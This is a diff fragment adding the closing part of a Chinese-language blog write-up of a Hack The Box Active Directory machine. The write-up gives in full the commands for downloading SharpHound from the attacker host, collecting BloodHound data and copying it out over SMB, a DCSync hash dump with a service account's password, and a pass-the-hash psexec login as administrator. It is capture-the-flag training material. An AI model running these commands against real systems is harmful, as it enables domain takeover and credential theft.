+<p>上传 SharpHound</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.13/SharpHound.ps1 -O SharpHound.ps1</span><br></pre></td></tr></table></figure>
+
+<p>导入 power shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\SharpHound.ps1</span><br></pre></td></tr></table></figure>
+
+<p>收集信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-BloodHound -CollectionMethod All</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250422211352645.png" alt="image-20250422211352645"></p>
+<p>kali 本机开启 SMB 共享</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-smbserver -username kali -password kali -smb2support home .</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250422211802625.png" alt="image-20250422211802625"></p>
+<p>目标主机加入 SMB 共享，将生成的 zip 文件拷贝至 kali 本机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\10.10.14.13\home /user:kali kali</span><br><span class="line">dir \\10.10.14.13\home</span><br><span class="line">cp 20250422131305_BloodHound.zip \\10.10.14.13\home\20250422131305_BloodHound.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250422211825460.png" alt="image-20250422211825460"></p>
+<p><img src="/picture/image-20250422211704385.png" alt="image-20250422211704385"></p>
+<p>使用 bloodhound 分析，发现可以通过 DCsync 获得域 EGOTISTICAL-BANK.LOCAL 控制权间接获得域 DOMAIN ADMINS 控制权</p>
+<p><img src="/picture/image-20250423113124750.png" alt="image-20250423113124750"></p>
+<p>使用 secretsdump 进行 DCsync 攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -just-dc-user administrator &#x27;egotistical-bank.local&#x27;/&#x27;svc_loanmgr&#x27;:&#x27;Moneymakestheworldgoround!&#x27;@10.129.223.5</span><br></pre></td></tr></table></figure>
+
+<p>获得 administrator 密码哈希</p>
+<p><img src="/picture/image-20250423113532943.png" alt="image-20250423113532943"></p>
+<p>进行 PtH 攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e administrator@10.129.223.5</span><br></pre></td></tr></table></figure>
+
+<p>拿下域控职权</p>
+<p><img src="/picture/image-20250423113548061.png" alt="image-20250423113548061"></p>
+<p>在 administrator 的桌面获得 root.txt</p>
+<p><img src="/picture/image-20250423113724954.png" alt="image-20250423113724954"></p>
+<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250423114103163.png" alt="image-20250423114103163"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>HTB</tag>
+        <tag>AD</tag>
+      </tags>
+  </entry>
 </search>
